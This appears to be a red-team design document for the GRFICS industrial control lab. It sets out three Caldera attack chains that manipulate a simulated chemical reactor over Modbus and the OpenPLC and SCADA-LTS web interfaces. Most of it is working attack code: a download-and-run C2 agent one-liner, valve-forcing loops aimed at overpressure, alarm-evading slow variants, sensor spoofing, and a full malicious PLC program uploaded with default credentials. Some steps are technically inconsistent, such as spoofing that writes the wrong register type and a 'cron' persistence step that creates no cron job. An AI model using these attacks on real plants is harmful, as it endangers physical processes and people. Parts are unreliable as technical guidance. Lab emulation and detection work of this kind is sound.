# GRFICS ICS/OT Attack Chain Design for Caldera

## Environment Reference

### Network Topology

| Zone | Subnet | Assets |
|------|--------|--------|
| **ICS Process Net** (`b-ics-net`) | `192.168.95.0/24` | Simulation (.10-.15), PLC (.2), EWS (.5), Router (.200) |
| **DMZ** (`c-dmz-net`) | `192.168.90.0/24` | HMI (.107), Kali (.6), Caldera (.250), Router (.200) |
| **Admin** (`a-grfics-admin`) | Docker bridge | All containers (management plane) |

### ICS Asset Inventory

| Asset | IP | Port(s) | Protocol | Role | Credentials |
|-------|----|---------|----------|------|-------------|
| Simulation (Feed 1) | 192.168.95.10 | 502/tcp | Modbus TCP | Remote I/O - Feed 1 valve/flow | -- |
| Simulation (Feed 2) | 192.168.95.11 | 502/tcp | Modbus TCP | Remote I/O - Feed 2 valve/flow | -- |
| Simulation (Purge) | 192.168.95.12 | 502/tcp | Modbus TCP | Remote I/O - Purge valve/flow | -- |
| Simulation (Product) | 192.168.95.13 | 502/tcp | Modbus TCP | Remote I/O - Product valve/flow | -- |
| Simulation (Tank) | 192.168.95.14 | 502/tcp | Modbus TCP | Remote I/O - Pressure/Level | -- |
| Simulation (Analyzer) | 192.168.95.15 | 502/tcp | Modbus TCP | Remote I/O - Composition (A/B/C) | -- |
| PLC (OpenPLC) | 192.168.95.2 | 8080/tcp, 502/tcp | HTTP, Modbus | PLC Runtime + Web API | `openplc:openplc` |
| EWS | 192.168.95.5 | 6080/tcp | HTTP (noVNC) | Engineering Workstation | -- |
| HMI (SCADA-LTS) | 192.168.90.107 | 8080/tcp | HTTP | Operator HMI | `admin:admin` |
| Router/FW | 192.168.95.200 / 192.168.90.200 | 5000/tcp | HTTP | Firewall + Suricata IDS | `admin:password` |

### Modbus Register Map (from `mbconfig.cfg` and device scripts)

| Device | IP | Holding Reg [1] (write) | Input Reg [1] | Input Reg [2] | Input Reg [3] |
|--------|----|------------------------|---------------|---------------|---------------|
| Feed 1 | .10 | f1_valve_sp (0-65535 = 0-100%) | f1_valve_pos | f1_flow | -- |
| Feed 2 | .11 | f2_valve_sp | f2_valve_pos | f2_flow | -- |
| Purge | .12 | purge_valve_sp | purge_valve_pos | purge_flow | -- |
| Product | .13 | product_valve_sp | product_valve_pos | product_flow | -- |
| Tank | .14 | -- (read only) | pressure (0-3200 kPa) | level (0-100%) | -- |
| Analyzer | .15 | -- (read only) | A_in_purge (0-1.0) | B_in_purge | C_in_purge |

### PLC Control Logic Summary (from `326339.st`)

The PLC runs proportional control at 20ms cycle:
- **f1_valve_sp** = f(product_flow, product_flow_setpoint) with k=20.0, range 0-500
- **purge_valve_sp** = f(pressure, pressure_sp) with k=-20.0, range 0-3200
- **f2_valve_sp** = f(a_in_purge, a_setpoint) with k=1.0, range 0-100
- **product_valve_sp** = f(level, level_sp) with k=-10.0, range 0-100
- **pressure_override**: reduces product_flow_setpoint when pressure > 2900 kPa
- **run_bit** (`%QX5.0`): if FALSE, feeds close (0), purge/product open (65535) = safe shutdown

Default setpoints: product_flow=13107, a_setpoint=30801, pressure_sp=55295, override_sp=31675, level_sp=28835.

---

## Assumptions

1. **Network Access**: The attacker starts from the Kali container (192.168.90.6) in the DMZ. The router forwards all traffic between DMZ and ICS net by default (`iptables -P FORWARD ACCEPT`).
2. **Credentials**: Default credentials are in use on PLC (`openplc:openplc`), HMI (`admin:admin`), and router (`admin:password`). These are discoverable via the 3D walkthrough (sticky notes) or brute force.
3. **Protocols**: Modbus TCP (port 502) is unauthenticated by design. There is no TLS, no Modbus security, no whitelisting on the Modbus servers.
4. **Caldera Agent Deployment**: A Sandcat or Manx agent can be deployed on Kali (pre-staged) and later on EWS or PLC after compromise. The Caldera server at 192.168.90.250 is reachable from both DMZ and (via router) ICS net.
5. **Suricata IDS** on the router may generate alerts for known Modbus signatures but takes no blocking action by default.
6. **OpenPLC Web API** allows program upload, start/stop, and configuration changes via HTTP with valid credentials.

---

## Attack Chain 1: Stealthy Process Manipulation via Direct Modbus Write

**Adversary Profile**: Sophisticated attacker targeting process integrity. Goal is to cause a gradual pressure buildup in the reactor to exceed safe operating limits while remaining undetected.

**Kill Chain Summary**: DMZ foothold -> Network discovery -> Pivot through router -> Modbus device enumeration -> Process state reconnaissance -> Targeted valve manipulation -> Pressure excursion

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
|-------|------|---------------|-------------|----------------|--------------------------|
| **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Deploy Caldera Sandcat agent on Kali via HTTP beacon to `http://192.168.90.250:8888` | Establish C2 channel from DMZ attacker node |
| **Discovery** | 2 | Remote System Discovery | T0846 | `nmap -sn 192.168.90.0/24` from Kali agent | Discover HMI (.107), Router (.200), Caldera (.250) on DMZ |
| **Discovery** | 3 | Network Sniffing | T0842 | `tcpdump -i eth0 -nn port 502` on Kali (after pivot) | Observe Modbus traffic patterns between PLC and simulation |
| **Lateral Movement** | 4 | Default Credentials | T0812 | Route exists via router; use Modbus TCP directly to 192.168.95.x | Pivot from DMZ to ICS network through router |
| **Discovery** | 5 | Remote System Information Discovery | T0888 | `modbus_cli 192.168.95.10 read_device_info --level 3` for each .10-.15 | Enumerate all 6 Modbus devices, get vendor/product info |
| **Collection** | 6 | Point & Tag Identification | T0861 | `modbus_cli <ip> read_ir 1 3` for each device | Map register contents to physical process variables |
| **Collection** | 7 | Monitor Process State | T0801 | Repeatedly read IR[1-2] from Tank (.14) to observe pressure/level trends | Establish baseline: normal pressure ~2450 kPa, level ~65% |
| **Inhibit Response** | 8 | Manipulation of Control | T0831 | `modbus_cli 192.168.95.12 write_r 1 0` (close purge valve) | Purge valve closes -> pressure begins rising |
| **Impact** | 9 | Manipulation of Control | T0831 | `modbus_cli 192.168.95.10 write_r 1 65535` (open feed valve fully) | Feed 1 wide open + purge closed -> rapid pressure excursion |
| **Impact** | 10 | Damage to Property | T0879 | Sustained writes every 100ms to override PLC corrections | Pressure exceeds 3200 kPa -> potential reactor overpressure event |

### Caldera Implementation

#### Step 1: Deploy Agent on Kali

From the Caldera web UI (`http://localhost:8888`, login `red:fortiphyd-red`):

1. Navigate to **Agents** -> **Deploy an Agent**
2. Select **Sandcat** agent, platform **Linux**
3. Set the app.contact.http to `http://192.168.90.250:8888`
4. Copy the deployment one-liner. On Kali (via noVNC at `http://localhost:6088`), open a terminal and run:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```

The agent will beacon back and appear in the Caldera Agents panel as the Kali host.

#### Step 2: Create Custom Abilities

Create these ability YAML files and place them in `plugins/modbus/data/abilities/` inside the Caldera container (or use the Caldera REST API).

**Ability: Network Scan (Discovery)**

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000001
  name: Nmap ICS Subnet Discovery
  description: Scan the ICS process network for live Modbus hosts
  tactic: discovery
  technique_id: T0846
  technique_name: Remote System Discovery
  executors:
  - platform: linux
    name: sh
    command: >
      nmap -sn 192.168.95.0/24 -oG - | grep "Up" | awk '{print $2}'
    timeout: 60
```

**Ability: Modbus Read Device Info (already exists as `9360ba0d-...`)**

Uses the existing fact source targeting `192.168.95.10:502`.

**Ability: Read Process State (Collection)**

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000002
  name: Modbus - Read Tank Pressure and Level
  description: Read input registers from Tank device to observe pressure and liquid level
  tactic: collection
  technique_id: T0801
  technique_name: Monitor Process State
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2
    payloads:
    - modbus_cli
```

**Ability: Read All Process Variables (Collection)**

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000003
  name: Modbus - Enumerate All Process I/O
  description: Read input registers from all 6 Modbus devices to map the process
  tactic: collection
  technique_id: T0861
  technique_name: Point & Tag Identification
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== Feed 1 (192.168.95.10) ===" &&
      ./modbus_cli 192.168.95.10 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&
      echo "=== Feed 2 (192.168.95.11) ===" &&
      ./modbus_cli 192.168.95.11 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.11 --port 502 read_hr 1 1 &&
      echo "=== Purge (192.168.95.12) ===" &&
      ./modbus_cli 192.168.95.12 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&
      echo "=== Product (192.168.95.13) ===" &&
      ./modbus_cli 192.168.95.13 --port 502 read_ir 1 2 &&
      ./modbus_cli 192.168.95.13 --port 502 read_hr 1 1 &&
      echo "=== Tank (192.168.95.14) ===" &&
      ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&
      echo "=== Analyzer (192.168.95.15) ===" &&
      ./modbus_cli 192.168.95.15 --port 502 read_ir 1 3
    payloads:
    - modbus_cli
```

**Ability: Close Purge Valve (Impact)**

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000004
  name: Modbus - Close Purge Valve
  description: |
    Write holding register 1 on Purge device (192.168.95.12) to 0,
    forcing the purge valve fully closed. This traps gas in the reactor,
    causing pressure to build.
  tactic: inhibit-response-function
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 50); do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;
        sleep 0.1;
      done
    payloads:
    - modbus_cli
```

**Ability: Open Feed Valve Fully (Impact)**

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000005
  name: Modbus - Force Feed 1 Valve Open
  description: |
    Write holding register 1 on Feed 1 device (192.168.95.10) to 65535,
    forcing maximum inflow. Combined with purge closure, this rapidly
    increases reactor pressure.
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 50); do
        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
        sleep 0.1;
      done
    payloads:
    - modbus_cli
```

#### Step 3: Create Adversary Profile

```yaml
name: ICS Pressure Manipulation Adversary
description: >
  Stealthy attack chain targeting the GRFICS chemical process.
  Discovers ICS network, enumerates Modbus devices, reads process state,
  then manipulates valves to cause reactor overpressure.
adversary_id: cc001111-aaaa-bbbb-cccc-000000000001
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Read device info (existing)
- a1b2c3d4-1111-1111-1111-000000000003  # Modbus - Enumerate All Process I/O (Point & Tag Identification : T0861)
- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
- a1b2c3d4-1111-1111-1111-000000000004  # Modbus - Close Purge Valve (Manipulation of Control : T0831 )
- a1b2c3d4-1111-1111-1111-000000000005  # Modbus - Force Feed 1 Valve Open (Manipulation of Control : T0831)
- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
```

#### Step 4: Configure and Run Operation

Via the Caldera UI:

1. Go to **Operations** -> **Create Operation**
2. **Name**: `ICS-Pressure-Attack-001`
3. **Adversary**: `ICS Pressure Manipulation Adversary`
4. **Fact Source**: `Modbus Sample Facts` (ID `0033b644-...`)
5. **Planner**: `atomic` (sequential execution)
6. **Group**: `red` (the Kali agent)
7. **Autonomous**: `1` (run each step automatically)
8. Click **Start**

Alternatively, use the REST API:

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ICS-Pressure-Attack-001",
    "adversary": {"adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": false,
    "autonomous": 1
  }'
```

### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| Nmap scan | Router/Suricata (`shared_logs/router/eve.json`) | ICMP sweep + SYN scan alerts | DC0078 (Network Traffic Flow) |
| Modbus read_device_info | Router/Suricata | Modbus FC=0x2B on port 502 from 192.168.90.6 | DC0082 (Network Traffic Content) |
| Read input registers | Router/Suricata, PLC daemon.log | Modbus FC=0x04 reads from non-PLC source IP | DC0085 (Network Connection Creation) |
| Write holding registers | Router/Suricata, PLC daemon.log | Modbus FC=0x06 writes from unauthorized source (192.168.90.6 vs expected 192.168.95.2) | DC0082 (Network Traffic Content) |
| Pressure excursion | Simulation process_alarms (`shared_logs/simulation/alarms`) | Pressure value exceeding normal range (>3000 kPa) | DC0109 (Process/Event Alarm) |
| Valve position change | HMI/SCADA-LTS logs (`shared_logs/hmi/catalina`) | Sudden purge valve close + feed valve open event | DC0109 (Process/Event Alarm) |

### Variation: Stealthier Approach

Instead of slamming valves to extremes, write small incremental changes (e.g., reduce purge by 5% every 30 seconds) to stay within normal operating noise:

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000006
  name: Modbus - Gradual Purge Reduction
  description: Incrementally close purge valve to avoid sudden process alarms
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      val=60000; while [ $val -gt 0 ]; do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 $val;
        val=$((val - 3000));
        sleep 30;
      done
    payloads:
    - modbus_cli
```

This takes ~10 minutes to fully close the valve, giving pressure time to rise gradually and avoiding spike-based alarm thresholds.

### Escalation Path: Dual Valve + Sensor Spoofing

After closing purge and opening feed, simultaneously write false "normal" values to the Tank device's input registers to mask the pressure rise from the PLC's perspective:

```yaml
- id: a1b2c3d4-1111-1111-1111-000000000007
  name: Modbus - Spoof Tank Pressure Reading
  description: |
    Write false input register values to the Tank Modbus device,
    making the PLC believe pressure is normal while it actually rises.
    Targets IR address 1 on 192.168.95.14.
  tactic: evasion
  technique_id: T0856
  technique_name: Spoof Reporting Message
  executors:
  - platform: linux
    name: sh
    command: >
      while true; do
        ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000;
        sleep 0.1;
      done
    payloads:
    - modbus_cli
```

This prevents the PLC's `pressure_override` function from activating (it triggers at ~2900 kPa), allowing unrestricted pressure buildup.

---

## Attack Chain 2: PLC Logic Replacement via OpenPLC Web Interface

**Adversary Profile**: Targeted attacker who compromises the PLC programming interface to upload malicious control logic. Goal is to replace the legitimate Structured Text program with one that disables safety interlocks.

**Kill Chain Summary**: DMZ foothold -> HMI compromise -> Credential harvesting -> PLC web login -> Program download (recon) -> Malicious ST upload -> Process disruption

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
|-------|------|---------------|-------------|----------------|--------------------------|
| **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Access HMI web interface at `192.168.90.107:8080` with `admin:admin` | Gain HMI access, observe process data |
| **Discovery** | 2 | Remote System Discovery | T0846 | From HMI context, enumerate data sources pointing to `192.168.95.2` (PLC) | Identify PLC IP and Modbus configuration |
| **Credential Access** | 3 | Default Credentials | T0812 | Attempt `openplc:openplc` on `http://192.168.95.2:8080` | Authenticate to OpenPLC web runtime |
| **Collection** | 4 | Program Upload | T0843 | Download current program via OpenPLC web UI (`/programs` endpoint) | Obtain `326339.st` for analysis |
| **Lateral Movement** | 5 | Program Upload | T0843 | Upload malicious ST file via OpenPLC web API | Replace legitimate control logic |
| **Inhibit Response** | 6 | Modify Program | T0889 | Malicious ST sets `run_bit := FALSE` or removes safety interlocks | PLC executes attacker logic |
| **Impact** | 7 | Loss of Control | T0827 | Modified program opens all valves / ignores pressure override | Chemical process goes out of control |

### Caldera Implementation

#### Step 1: Agent on Kali (same as Chain 1)

#### Step 2: Create Abilities

**Ability: Brute-force OpenPLC Login**

```yaml
- id: b2c3d4e5-2222-2222-2222-000000000001
  name: OpenPLC - Default Credential Access
  description: Attempt login to OpenPLC web runtime with default credentials
  tactic: credential-access
  technique_id: T0812
  technique_name: Default Credentials
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/plc_cookies.txt -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/login"
      -d "username=openplc&password=openplc"
      -L -o /tmp/plc_login.html -w "%{http_code}" &&
      echo "Login response saved" &&
      grep -q "Dashboard" /tmp/plc_login.html && echo "LOGIN_SUCCESS" || echo "LOGIN_FAILED"
    timeout: 30
```

**Ability: Download Current PLC Program**

```yaml
- id: b2c3d4e5-2222-2222-2222-000000000002
  name: OpenPLC - Download Running Program
  description: Download the currently active Structured Text program from OpenPLC
  tactic: collection
  technique_id: T0845
  technique_name: Program Upload
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      "http://192.168.95.2:8080/get-program-body?program_name=326339.st"
      -o /tmp/original_program.st &&
      echo "Downloaded program:" &&
      head -20 /tmp/original_program.st
    timeout: 30
```

**Ability: Upload Malicious PLC Program**

```yaml
- id: b2c3d4e5-2222-2222-2222-000000000003
  name: OpenPLC - Upload Malicious Control Logic
  description: |
    Upload a modified ST program that disables the pressure override
    safety function and forces all valves to dangerous positions.
    The run_bit is kept TRUE to avoid triggering the safe-state fallback.
  tactic: impair-process-control
  technique_id: T0889
  technique_name: Modify Program
  executors:
  - platform: linux
    name: sh
    command: >
      cat > /tmp/malicious.st << 'STEOF'

      FUNCTION scale_to_real : REAL
        VAR_INPUT raw_input_value : UINT := 0; END_VAR
        VAR_OUTPUT scaled_real : REAL := 0.0; END_VAR
        VAR_INPUT real_max : REAL := 0.0; real_min : REAL := 0.0; END_VAR
        VAR raw_max : UINT := 65535; raw_min : UINT := 0; rate : REAL := 1.0; offset : REAL := 1.0; END_VAR
        rate := (real_max - real_min) / UINT_TO_REAL(raw_max - raw_min);
        offset := real_min - UINT_TO_REAL(raw_min)*rate;
        scaled_real := UINT_TO_REAL(raw_input_value)*rate + offset;
        scale_to_real := scaled_real;
      END_FUNCTION

      FUNCTION scale_to_uint : UINT
        VAR_INPUT real_in : REAL := 0.0; END_VAR
        VAR_OUTPUT uint_out : UINT := 0; END_VAR
        uint_out := REAL_TO_UINT((real_in / 100.0) * 65535.0);
        scale_to_uint := uint_out;
      END_FUNCTION

      PROGRAM main1
        VAR
          f1_valve_sp AT %QW100 : UINT;
          f2_valve_sp AT %QW101 : UINT;
          purge_valve_sp AT %QW102 : UINT;
          product_valve_sp AT %QW103 : UINT;
          run_bit AT %QX5.0 : BOOL := TRUE;
        END_VAR
        f1_valve_sp := 65535;
        f2_valve_sp := 65535;
        purge_valve_sp := 0;
        product_valve_sp := 0;
        run_bit := TRUE;
      END_PROGRAM

      CONFIGURATION Config0
        RESOURCE Res0 ON PLC
          TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
          PROGRAM instance0 WITH task0 : main1;
        END_RESOURCE
      END_CONFIGURATION

      STEOF

      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/upload-program"
      -F "file=@/tmp/malicious.st"
      -L -o /tmp/upload_result.html -w "%{http_code}" &&
      echo "Program uploaded"
    timeout: 60
```

**Ability: Compile and Start Malicious Program**

```yaml
- id: b2c3d4e5-2222-2222-2222-000000000004
  name: OpenPLC - Compile and Run Malicious Logic
  description: Trigger compilation and start the uploaded malicious program on OpenPLC
  tactic: impair-process-control
  technique_id: T0889
  technique_name: Modify Program
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/compile-program?program_name=malicious.st"
      -o /tmp/compile_result.html &&
      sleep 5 &&
      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/start-plc"
      -o /tmp/start_result.html &&
      echo "Malicious program compiled and started"
    timeout: 120
```

#### Step 3: Adversary Profile

```yaml
name: PLC Logic Replacement Adversary
description: >
  Compromise PLC via web interface using default credentials,
  download legitimate program for analysis, upload malicious
  control logic that removes safety interlocks and forces
  dangerous valve positions.
adversary_id: cc002222-aaaa-bbbb-cccc-000000000002
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
- b2c3d4e5-2222-2222-2222-000000000001  # OpenPLC - Default Credential Access (Default Credentials : T0812)
- b2c3d4e5-2222-2222-2222-000000000002  # OpenPLC - Download Running Program (Program Upload : T0845)
- b2c3d4e5-2222-2222-2222-000000000003  # OpenPLC - Upload Malicious Control Logic (Modify Program : T0889)
- b2c3d4e5-2222-2222-2222-000000000004  # OpenPLC - Compile and Run Malicious Logic (Modify Program : T0889)
- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
```

#### Step 4: Operation Setup

Same process as Chain 1 -- create operation via UI or API, select the `PLC Logic Replacement Adversary`, use the `red` agent group (Kali), `atomic` planner, `Modbus Sample Facts` source.

### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| PLC web login | PLC auth.log (`shared_logs/plc/auth.log`) | HTTP auth from 192.168.90.6 to port 8080 | DC0067 (Logon Session Creation) |
| Program download | PLC syslog/daemon.log | GET request to /get-program-body | DC0033 (Process Creation) |
| Program upload | PLC syslog/daemon.log, PLC audit | POST to /upload-program with new .st file | DC0021 (File Modification), DC0034 (Process Metadata) |
| Compile trigger | PLC syslog/daemon.log | `compile_program.sh` execution, matiec compiler invocation | DC0033 (Process Creation) |
| PLC restart | PLC daemon.log | OpenPLC runtime stop + start cycle | DC0033 (Process Termination / Creation) |
| Process impact | Simulation alarms, Tank IR values | All feeds max, purge closed, pressure rising | DC0109 (Process/Event Alarm) |
| Suricata | Router eve.json | HTTP traffic from DMZ host to PLC on port 8080 | DC0078 (Network Traffic Flow) |

### Variation: Subtle Logic Modification

Instead of replacing the entire program, modify only the `pressure_override` function to have a higher threshold (e.g., change `override_sp_real` from 2900.0 to 9999.0). This preserves normal-looking control behavior but disables the safety interlock that prevents overpressure:

```
override_sp_real : REAL := 9999.0;  (* was 2900.0 *)
```

This is harder to detect because the PLC program looks mostly unchanged and control loops still operate normally -- until pressure exceeds what the override would have caught.

### Escalation Path: Persistent Backdoor via Cron on PLC

After uploading the malicious program, deploy a persistence mechanism on the PLC host:

```yaml
- id: b2c3d4e5-2222-2222-2222-000000000005
  name: OpenPLC - Deploy Persistent Watchdog
  description: |
    Create a cron job on the PLC that re-uploads and recompiles the
    malicious program every 5 minutes, defeating any operator restore.
  tactic: persistence
  technique_id: T0839
  technique_name: Module Firmware
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      -X POST "http://192.168.95.2:8080/upload-program"
      -F "file=@/tmp/malicious.st" &&
      echo "Re-uploaded malicious program as persistence mechanism"
    timeout: 30
```

---

## Attack Chain 3: HMI Compromise + Operator Deception + Process Manipulation

**Adversary Profile**: APT-style attacker who compromises the SCADA HMI to both manipulate the process AND deceive operators by modifying displayed values. Mirrors the TRITON/TRISIS concept of attacking safety while masking the attack.

**Kill Chain Summary**: HMI web compromise -> Data source enumeration -> Modbus proxy insertion -> Process manipulation with simultaneous HMI display falsification

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
|-------|------|---------------|-------------|----------------|--------------------------|
| **Initial Access** | 1 | Default Credentials | T0812 | Login to SCADA-LTS at `192.168.90.107:8080` with `admin:admin` | Full HMI administrative access |
| **Discovery** | 2 | Remote System Discovery | T0846 | Enumerate SCADA-LTS data sources and Modbus configuration | Identify PLC connection at 192.168.95.2, register mappings |
| **Collection** | 3 | Screen Capture | T0852 | Capture current HMI dashboard state / record normal values | Establish baseline operator view to replicate later |
| **Discovery** | 4 | Remote System Information Discovery | T0888 | `modbus_cli` read_device_info against all .10-.15 targets | Full Modbus device fingerprinting |
| **Collection** | 5 | Monitor Process State | T0801 | Read all IR/HR values across all 6 devices | Complete process state snapshot |
| **Evasion** | 6 | Spoof Reporting Message | T0856 | Modify SCADA-LTS data source polling to point at attacker-controlled proxy | HMI shows stale/false process values |
| **Impact** | 7 | Manipulation of Control | T0831 | Write dangerous values to Modbus devices directly | Physical process goes out of specification |
| **Impact** | 8 | Loss of View | T0829 | Operators see normal values on HMI while process deviates | Operator cannot detect the attack via HMI |

### Caldera Implementation

#### Step 1: Agent Deployment (same as Chain 1)

#### Step 2: Create Abilities

**Ability: SCADA-LTS Login and Recon**

```yaml
- id: c3d4e5f6-3333-3333-3333-000000000001
  name: SCADA-LTS - Default Credential Login
  description: Login to SCADA-LTS HMI with default admin credentials
  tactic: credential-access
  technique_id: T0812
  technique_name: Default Credentials
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/hmi_cookies.txt
      -X POST "http://192.168.90.107:8080/ScadaBR/login.htm"
      -d "username=admin&password=admin"
      -L -o /tmp/hmi_login.html -w "%{http_code}" &&
      grep -qi "scada\|dashboard\|logged" /tmp/hmi_login.html &&
      echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
    timeout: 30
```

**Ability: Enumerate SCADA-LTS Data Sources**

```yaml
- id: c3d4e5f6-3333-3333-3333-000000000002
  name: SCADA-LTS - Enumerate Data Sources
  description: |
    Use SCADA-LTS REST API to enumerate all configured data sources
    and data points, revealing Modbus connections and register mappings
  tactic: discovery
  technique_id: T0846
  technique_name: Remote System Discovery
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/hmi_cookies.txt
      "http://192.168.90.107:8080/ScadaBR/api/datasources"
      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
      curl -s -b /tmp/hmi_cookies.txt
      "http://192.168.90.107:8080/ScadaBR/api/datapoints"
      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
      echo "API enumeration attempted"
    timeout: 30
```

**Ability: Simultaneous Process Attack + Sensor Spoofing**

```yaml
- id: c3d4e5f6-3333-3333-3333-000000000003
  name: Modbus - Combined Attack and Deception
  description: |
    Simultaneously: (1) Close purge valve on 192.168.95.12,
    (2) Open feed valves on 192.168.95.10/11, and
    (3) Write false "normal" pressure values to Tank device (192.168.95.14)
    so the PLC reads spoofed values and does not trigger pressure override.
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      attack_loop() {
        for i in $(seq 1 100); do
          ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null;
          ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 2>/dev/null;
          ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 2>/dev/null;
          ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000 2>/dev/null;
          sleep 0.2;
        done
      };
      attack_loop
    payloads:
    - modbus_cli
```

**Ability: Modbus Fuzzing for Chaos**

```yaml
- id: c3d4e5f6-3333-3333-3333-000000000004
  name: Modbus - Fuzz All Registers for Maximum Disruption
  description: |
    Use modbus_cli fuzz_r to randomly write all holding registers
    on Feed 1, Feed 2, and Purge devices, creating unpredictable
    process behavior that is difficult to diagnose.
  tactic: impair-process-control
  technique_id: T0831
  technique_name: Manipulation of Control
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.10 --port 502 fuzz_r 0 10 50 --wait 0.1 &
      ./modbus_cli 192.168.95.11 --port 502 fuzz_r 0 10 50 --wait 0.1 &
      ./modbus_cli 192.168.95.12 --port 502 fuzz_r 0 10 50 --wait 0.1 &
      wait
    payloads:
    - modbus_cli
```

#### Step 3: Adversary Profile

```yaml
name: HMI Compromise and Operator Deception Adversary
description: >
  APT-style attack that compromises the HMI to gain process visibility,
  then simultaneously manipulates valves AND spoofs sensor readings to
  prevent both automated safety functions and operator awareness from
  detecting the attack.
adversary_id: cc003333-aaaa-bbbb-cccc-000000000003
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Network discovery
- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Modbus device info
- c3d4e5f6-3333-3333-3333-000000000001  # HMI login
- c3d4e5f6-3333-3333-3333-000000000002  # Enumerate data sources
- a1b2c3d4-1111-1111-1111-000000000003  # Read all process I/O
- c3d4e5f6-3333-3333-3333-000000000003  # Combined attack + deception
```

#### Step 4: Operation (same pattern as Chains 1 & 2)

### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| HMI login | HMI auth.log, Tomcat catalina.log (`shared_logs/hmi/catalina`) | POST to /login.htm from 192.168.90.6 | DC0067 (Logon Session Creation) |
| API enumeration | Tomcat access logs | GET /api/datasources, /api/datapoints from attacker IP | DC0078 (Network Traffic Flow) |
| Modbus writes to multiple devices | Router Suricata eve.json | Burst of FC=0x06 writes from 192.168.90.6 to .10,.11,.12,.14 | DC0082 (Network Traffic Content) |
| Sensor spoofing on .14 | Simulation process alarms | Discrepancy between simulation internal pressure and Modbus-reported pressure | DC0109 (Process/Event Alarm) |
| Purge valve manipulation | PLC app logs, simulation alarms | Purge valve position drops to 0 despite PLC commanding otherwise | DC0109 (Process/Event Alarm) |
| Rate of Modbus transactions | Router Suricata | Abnormal burst of 5+ Modbus writes per second from a single source | DC0085 (Network Connection Creation) |

